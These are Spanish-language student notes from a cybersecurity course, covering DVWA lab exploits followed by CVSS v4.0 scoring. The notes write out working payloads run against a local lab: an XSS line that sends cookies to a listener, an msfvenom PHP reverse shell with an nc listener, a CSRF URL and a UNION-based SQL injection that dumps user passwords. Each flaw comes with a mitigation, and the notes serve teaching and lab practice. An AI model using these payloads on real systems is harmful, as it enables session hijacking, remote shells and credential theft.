# 📓 Notas de Clase — Gestión de Vulnerabilidades en Aplicaciones

**Especialización:** Ciberseguridad  
**Plataforma de laboratorio:** DVWA (Damn Vulnerable Web Application) sobre Docker

---

## 📌 Sesión 1 — Vulnerabilidades Web en DVWA (Nivel Low)

**Fecha:** 28/02/2026

### Vulnerabilidad 1 — XSS Reflejado

El servidor recibe un parámetro con código JS del atacante y lo devuelve en la respuesta HTML sin sanitizar. El navegador de la víctima lo ejecuta creyendo que viene del servidor legítimo.

**Ataque realizado:**
```bash
# Levantar servidor receptor de cookies
python3 -m http.server 8888

# Payload inyectado en el campo vulnerable
<script>new Image().src="http://127.0.0.1:8888/?c="+document.cookie;</script>
```
El navegador ejecutó el script → se recibió `PHPSESSID`. Con ese ID en F12 → Application → Cookies se accedió a la sesión sin contraseña.

**Causa raíz:** DVWA nivel Low no aplica filtro sobre el parámetro `name`.  
**Mitigación:** `htmlspecialchars()` en PHP / `DOMPurify` en JS al mostrar datos del usuario.

---

### Vulnerabilidad 2 — XSS Almacenado

El payload se guarda en la base de datos. Cada vez que cualquier usuario carga la página, el script se ejecuta automáticamente. Más grave que el reflejado porque afecta a **todos los usuarios**.

**Ataque realizado:**
1. El campo `Message` tenía `maxlength="50"` en el HTML → se cambió a `100` desde F12.
2. Payload inyectado:
```html
<script>window.location.href="https://google.com";</script>
```
3. Cualquier usuario que abra esa página queda redirigido.  
4. Para limpiar:
```sql
sudo mysql -u root -p
USE dvwa;
UPDATE guestbook SET comment = REPLACE(comment, '<script>', '') WHERE comment LIKE '%<script>%';
```

**Punto clave:** `maxlength` es una restricción solo del cliente (HTML). El servidor debe validar también en backend.

---

### Vulnerabilidad 3 — Upload Backdoor

El servidor permite subir cualquier archivo sin verificar si es una imagen real. Se sube un `.php` malicioso y el servidor lo ejecuta al acceder por URL.

**Ataque realizado:**
```bash
# Generar reverse shell
msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=4444 -f raw > danielaguirre.php

# Abrir listener
nc -lvnp 4444
```
Se sube el archivo por DVWA → al acceder a `http://127.0.0.1/dvwa/hackable/uploads/danielaguirre.php` el servidor ejecuta el PHP → shell obtenida.

**Mitigación:** Lista blanca de extensiones (`.jpg`, `.png`). Renombrar archivos con nombre aleatorio al guardar.

---

### Vulnerabilidad 4 — CSRF

El navegador envía automáticamente las cookies de sesión con cada petición HTTP. Un atacante construye una página que realiza una petición al sitio vulnerable **en nombre de la víctima autenticada**, sin que ella lo sepa.

**¿Por qué era vulnerable?** El cambio de contraseña usaba método GET:
```
http://dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```
Si la víctima hace clic mientras está autenticada → contraseña cambiada.

| | XSS | CSRF |
|---|---|---|
| ¿Dónde está el ataque? | Dentro del sitio víctima | En una página externa |
| ¿Qué aprovecha? | Falta de sanitización | Cookies automáticas |
| ¿Quién ejecuta? | Navegador de la víctima | Servidor víctima |

**Mitigación:** Token CSRF único por sesión + usar POST para acciones sensibles.

---

### 💡 Reflexión general Sesión 1

> Las 4 vulnerabilidades tienen la misma causa raíz: **confiar en el input del usuario sin validarlo**. La seguridad debe integrarse desde el diseño (**Secure by Design**), no como parche posterior.

**Comandos útiles DVWA:**
```bash
sudo docker stop dvwa    # Apagar
sudo docker start dvwa   # Encender
```

---

## 📌 Sesión 2 — CVSS v4.0

**Fecha:** 28/02/2026 (misma clase)

### ¿Qué es CVSS?

Estándar matemático de **NIST** / **FIRST** para cuantificar la severidad técnica de vulnerabilidades. Versión 4.0 lanzada en noviembre 2023 reemplaza a v3.1. Score: **0.0 – 10.0**

| Score | Severidad |
|---|---|
| 0.0 | None |
| 0.1 – 3.9 | Low |
| 4.0 – 6.9 | Medium |
| 7.0 – 8.9 | High |
| 9.0 – 10.0 | Critical |

### Grupos de métricas v4.0

| Grupo | Código | Descripción |
|---|---|---|
| Base | CVSS-B | Características intrínsecas — **score principal** |
| Threat | CVSS-BT | Estado actual del exploit en la wild |
| Environmental | CVSS-BE | Contexto específico de la organización |
| Supplemental | CVSS-BS | Contexto adicional — no cambia el score |

### Métricas Base — Exploitability

| Métrica | Valores | Nota |
|---|---|---|
| **AV** Attack Vector | N / A / L / P | N=red=mayor riesgo |
| **AC** Attack Complexity | L / H | L=reproducible siempre |
| **AT** Attack Requirements ⭐ nuevo | N / P | Condiciones del sistema víctima |
| **PR** Privileges Required | N / L / H | N=más crítico |
| **UI** User Interaction ⭐ cambia | N / Passive / Active | v3.1 era N/Required |

### Métricas de Impacto — Gran cambio respecto a v3.1

v3.1 tenía Scope (S) + CIA una vez. v4.0 **elimina Scope** y divide en dos sistemas:

| Código | Sistema | Significado en High |
|---|---|---|
| VC/VI/VA | Vulnerable System | Impacto total en el componente explotado |
| SC/SI/SA | Subsequent System | Impacto en sistemas adyacentes (antes: Scope Changed) |

### CVE vs CVSS

| | CVE | CVSS |
|---|---|---|
| Qué es | Identificador único | Sistema de scoring |
| Para qué | Describe la vulnerabilidad | Mide la severidad |
| Formato | CVE-AÑO-NÚMERO | Score 0.0 – 10.0 |

**Ejemplo:** CVE-2021-44228 (Log4j) → CVSS 3.1 Score: **10.0 Critical**

### CVSS vs Riesgo Real

> **CVSS solo mide severidad técnica.** No mide probabilidad de explotación, impacto de negocio ni contexto organizacional. Para el riesgo real: **Riesgo = Severidad × Probabilidad × Impacto de negocio**.

---

## 📌 Retos pendientes

| Reto | Descripción | Estado |
|---|---|---|
| Reto 9 | Command execution — imprimir usuarios del OS | ⬜ |
| Reto 10 | Command execution — ganar shell de Metasploitable | ⬜ |
| Reto 11 | Ganar shell de dvwa.seginfo.co | ⬜ |

**Pista Reto 11:** `http://localhost:8080/login.php`

---

*Notas actualizadas el 06/03/2026*
clase de hoy 07/03/2026
reto 13 realizar una inyeccion sql basada en \\
SOLUCION RETO 13 PAYLOAD Reto 13: 1\\' UNION SELECT user,password FROM users-- -

descargar burpsuite para identificar lo que viaja en las cabeceras
RETO 
RETO 14: ejecutar una inyeccion sql tipo blind que sea visible a nivel de burpsuite, pero que no sa visible con el mismo payload desde el navegadir

RETO 16: Mediante bruteforce obtener el password de un usuario, distinto a admin
not: requiere cookievalida puede también ejectuarse por burpsuite